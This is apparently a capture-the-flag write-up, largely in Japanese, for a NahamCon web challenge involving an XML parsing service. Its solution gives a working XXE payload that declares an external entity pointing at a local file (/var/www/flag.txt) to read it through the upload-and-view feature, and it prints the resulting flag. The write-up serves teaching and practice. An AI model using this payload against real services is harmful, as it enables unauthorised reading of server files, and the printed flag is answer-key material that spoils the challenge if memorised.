# EXtravagant:Web:50pts
**I've been working on a XML parsing service. It's not finished but there should be enough for you to try out.**  
**The flag is in /var/www**  

**Connect with:**  
- [http://challenge.nahamcon.com:30863](http://challenge.nahamcon.com:30863/)  

# Solution
URLにアクセスすると謎のサイトのようだ。  
EXtravagant XML  
[Home](site/home.png)  
フラグは`/var/www`にあり、XMLをパースするサービスのようである。  
[Trial](site/trial.png)でXMLファイルをアップロードし、[View](site/view.png)でファイル名を指定して確認できるらしい。  
XXEを狙う。  
`/var/www`にフラグがあるようなので以下に示すxxe.xmlで`/var/www/flag.txt`を読み取る。  
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///var/www/flag.txt" >]><foo>&xxe;</foo>
```
アップロードし、読み取るとflagが得られた。  
flag  
[flag.png](site/flag.png)  

## flag{639b72f2dd0017f454c44c3863c4e195}